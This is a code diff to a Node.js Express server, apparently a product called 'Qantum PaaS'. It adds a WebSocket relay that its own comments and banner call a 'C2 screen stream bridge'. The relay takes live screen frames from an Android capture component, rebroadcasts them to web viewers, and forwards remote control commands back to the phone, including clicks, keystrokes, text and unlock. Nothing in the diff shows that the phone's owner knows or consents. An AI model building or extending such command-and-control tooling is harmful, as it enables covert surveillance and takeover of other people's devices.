@@ -19,11 +19,14 @@
 require('dotenv').config();
 
 const express = require('express');
+const http = require('http');
 const cors = require('cors');
 const helmet = require('helmet');
 const path = require('path');
+const { WebSocketServer } = require('ws');
 
 const app = express();
+const server = http.createServer(app);
 const PORT = process.env.PORT || 3000;
 
 // ═══════════════════════════════════════════════════════════════
@@ -135,18 +138,85 @@ process.on('unhandledRejection', (reason, promise) => {
     cable.broadcast('HEALING_REQUIRED', { reason: 'Async Panic (unhandledRejection)', severity: 'HIGH' });
 });
 
+// ═══════════════════════════════════════════════════════════════
+// WEBSOCKET RELAY & C2 SCREEN STREAM BRIDGE
+// ═══════════════════════════════════════════════════════════════
+
+const wss = new WebSocketServer({ server });
+let phoneSocket = null;
+const viewerSockets = new Set();
+let latestScreenFrame = null;
+
+wss.on('connection', (ws, req) => {
+    let clientRole = 'unknown';
+
+    ws.on('message', (data, isBinary) => {
+        if (isBinary) {
+            // Binary frame sent from Android ScreenCaptureManager
+            phoneSocket = ws;
+            clientRole = 'phone';
+            latestScreenFrame = data;
+            // Broadcast screen frame to all connected web dashboard viewers
+            for (const viewer of viewerSockets) {
+                if (viewer.readyState === 1) { // OPEN
+                    viewer.send(data, { binary: true });
+                }
+            }
+        } else {
+            try {
+                const text = data.toString();
+                const json = JSON.parse(text);
+                if (json.role === 'viewer') {
+                    clientRole = 'viewer';
+                    viewerSockets.add(ws);
+                    // Send last frame immediately if available
+                    if (latestScreenFrame && ws.readyState === 1) {
+                        ws.send(latestScreenFrame, { binary: true });
+                    }
+                } else if (phoneSocket && phoneSocket.readyState === 1) {
+                    // Forward control events (click, swipe, key, text, unlock) to Android phone
+                    phoneSocket.send(text);
+                }
+            } catch (_) {}
+        }
+    });
+
+    ws.on('close', () => {
+        if (clientRole === 'viewer') {
+            viewerSockets.delete(ws);
+        } else if (ws === phoneSocket) {
+            phoneSocket = null;
+        }
+    });
+
+    ws.on('error', () => {});
+});
+
+// Broadcast records updates to viewers
+global.broadcastNewRecord = () => {
+    const msg = JSON.stringify({ type: 'NEW_RECORD' });
+    for (const viewer of viewerSockets) {
+        if (viewer.readyState === 1) {
+            viewer.send(msg);
+        }
+    }
+};
+
+global.getLatestScreen = () => latestScreenFrame;
+
 // Export for Vercel serverless
 module.exports = app;
 
-// Local / Render: start HTTP server
+// Local / Render: start HTTP server with WebSockets
 if (!process.env.VERCEL) {
-    app.listen(PORT, () => {
+    server.listen(PORT, () => {
         console.log(`
 ╔═══════════════════════════════════════════════════════════════╗
 ║                                                               ║
 ║   ⬡  Q A N T U M   P a a S   S E R V E R                    ║
 ║                                                               ║
 ║   🌐  http://localhost:${String(PORT).padEnd(5)}                              ║
+║   📡  WebSocket C2 Bridge: ✅ ACTIVE                          ║
 ║   💳  Stripe:    ${stripeReady ? '✅ CONNECTED' : '❌ NOT SET   '}                        ║
 ║   🔥  Firestore: ${firestoreReady ? '✅ CONNECTED' : '❌ NOT SET   '}                        ║
 ║   🧠  Phantom:   ✅ ARMED (Free Tier Demo)                    ║
